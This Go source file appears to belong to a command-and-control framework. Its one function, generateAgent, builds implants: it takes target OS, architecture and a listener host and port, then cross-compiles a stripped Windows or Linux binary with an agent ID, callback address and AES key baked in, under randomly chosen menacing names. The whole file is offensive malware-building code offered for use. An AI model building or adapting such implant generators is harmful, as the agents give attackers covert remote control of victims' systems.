package main

import (
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
)

func generateAgent(command string) {
	parts := strings.Fields(command)

	var goos, goarch, lhost, lport string
	var outputFile string

	for i, p := range parts {
		switch p {
		case "--os":
			goos = parts[i+1]
		case "--arch":
			goarch = parts[i+1]
		case "--lhost":
			lhost = parts[i+1]
		case "--lport":
			lport = parts[i+1]
		}
	}

	if goos == "" || goarch == "" || lhost == "" || lport == "" {
		fmt.Println("Usage: generate --os linux --arch amd64 --lhost 10.0.0.1 --lport 8080")
		return
	}

	agentID := uuid.New().String()[:8]
	outputDir, _ := os.Getwd()
	adjectives := []string{"DEAD", "SILENT", "BLIND", "HOLLOW", "GHOST", "DARK", "BROKEN", "VOID", "SHADOW", "CURSED"}
	nouns := []string{"COBRA", "PHANTOM", "WRAITH", "SPECTER", "RAVEN", "WOLF", "BYTE", "PULSE", "SIGNAL", "DAEMON"}

	rand.Seed(time.Now().UnixNano())
	name := fmt.Sprintf("%s_%s", adjectives[rand.Intn(len(adjectives))], nouns[rand.Intn(len(nouns))])

	if goos == "windows" {
		outputFile = fmt.Sprintf("%s/%s.exe", outputDir, name)
	} else {
		outputFile = fmt.Sprintf("%s/%s.elf", outputDir, name)
	}

	serverAddr := fmt.Sprintf("%s:%s", lhost, lport)
	keyBytes := make([]byte, 32)
	_, err := crand.Read(keyBytes)
	if err != nil {
		fmt.Printf("[-] failed to generate AES key: %s\n", err)
		return
	}
	aesKey := hex.EncodeToString(keyBytes)
	ldflags := fmt.Sprintf("-s -w -X main.AgentID=%s -X main.ServerAddr=%s -X main.AESKey=%s", agentID, serverAddr, aesKey)
	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputFile, "./cmd/agent")
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch)

	fmt.Printf("[*] generating %s/%s agent...\n", goos, goarch)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] build failed: %s\n", string(out))
		return
	}
	fmt.Printf("[+] agent saved: %s (ID: %s)\n", outputFile, agentID)

}
